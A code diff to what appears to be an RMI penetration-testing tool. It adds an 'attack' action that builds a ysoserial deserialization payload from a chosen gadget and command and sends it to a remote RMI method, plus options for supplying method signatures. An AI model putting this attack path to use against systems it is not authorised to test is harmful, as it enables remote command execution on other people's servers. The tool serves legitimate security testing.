@@ -17,6 +17,8 @@ import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.WordlistHandler;
 import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.RMIWhisperer;
+import javassist.CannotCompileException;
+import javassist.NotFoundException;
 
 public class Starter {
 
@@ -34,6 +36,10 @@ public class Starter {
 
         if( parser.getArgumentCount() >= 3 ) {
             action = parser.getPositionalString(2);
+
+            if( action == "attack" ) {
+                parser.checkArgumentCount(5);
+            }
         }
 
         Properties config = new Properties();
@@ -43,18 +49,26 @@ public class Starter {
         if( additionalConfig != null )
             Starter.loadConfig(additionalConfig, config, true);
 
+        int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "0"));
         int threadCount = Integer.valueOf(commandLine.getOptionValue("threads", config.getProperty("threads")));
         String sampleFolder = commandLine.getOptionValue("sample-folder", config.getProperty("sample-folder"));
         String wordlistFile = commandLine.getOptionValue("wordlist-file", config.getProperty("wordlist-file"));
         String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("template-folder"));
         String wordlistFolder = commandLine.getOptionValue("wordlist-folder", config.getProperty("wordlist-folder"));
+        String ysoserialPath = commandLine.getOptionValue("yso", config.getProperty("ysoserial"));
+        String functionSignature = commandLine.getOptionValue("signature", null);
         String boundName = commandLine.getOptionValue("bound-name", null);
 
-        Logger.verbose = !commandLine.hasOption("quite") && !commandLine.hasOption("json");
+        Logger.verbose = !commandLine.hasOption("json");
         boolean sslValue = commandLine.hasOption("ssl");
         boolean followRedirect = commandLine.hasOption("follow");
         boolean updateWordlists = commandLine.hasOption("update");
         boolean createSamples = commandLine.hasOption("create-samples");
+        boolean zeroArg = commandLine.hasOption("zero-arg");
+
+        if( commandLine.hasOption("no-color") ) {
+            Logger.disableColor();
+        }
 
         Formatter format = new Formatter(commandLine.hasOption("json"));
         RMIWhisperer rmi = new RMIWhisperer();
@@ -64,30 +78,62 @@ public class Starter {
         String[] boundNames = rmi.getBoundNames();
         ArrayList<HashMap<String,String>> boundClasses = rmi.getClassNames(boundNames);
 
+        MethodCandidate candidate = null;
+        if( functionSignature != null ) {
+
+            try {
+                candidate = new MethodCandidate(functionSignature);
+
+            } catch (CannotCompileException | NotFoundException e) {
+                Logger.eprintln("Supplied method signature seems to be invalid.");
+                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
+                Logger.eprintln("Cannot continue from here.");
+                System.exit(1);
+            }
+        }
+
         switch( action ) {
 
             case "guess":
                 if( !containsUnknown(boundClasses.get(1)) )
                     break;
 
-                WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlists);
-                List<MethodCandidate> candidates = null;
+                List<MethodCandidate> candidates = new ArrayList<MethodCandidate>();
+                if( candidate != null ) {
 
-                try {
-                    candidates = wlHandler.getWordlistMethods();
-                } catch( IOException e ) {
-                    Logger.eprintlnMixedYellow("Caught exception while reading wordlist file(s):", e.getMessage());
-                    Logger.eprintln("Cannot continue from here.");
-                    System.exit(1);
+                    candidates.add(candidate);
+
+                } else {
+
+                    try {
+                        WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlists);
+                        candidates = wlHandler.getWordlistMethods();
+                    } catch( IOException e ) {
+                        Logger.eprintlnMixedYellow("Caught exception while reading wordlist file(s):", e.getMessage());
+                        Logger.eprintln("Cannot continue from here.");
+                        System.exit(1);
+                    }
                 }
 
                 MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), candidates);
-                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, createSamples);
+                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, createSamples, zeroArg);
 
                 format.listGuessedMethods(results);
                 break;
 
             case "attack":
+
+                String gadget = parser.getPositionalString(3);
+                String command = parser.getPositionalString(4);
+
+                HashMap<String,String> classes = boundClasses.get(0);
+                classes.putAll(boundClasses.get(1));
+
+                Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
+                MethodAttacker attacker = new MethodAttacker(rmi, classes, candidate);
+                attacker.attack(payload, boundName, argumentPos);
+
+                break;
 
             default:
                 Logger.printlnMixedYellow("Unknown action:", action, ".");
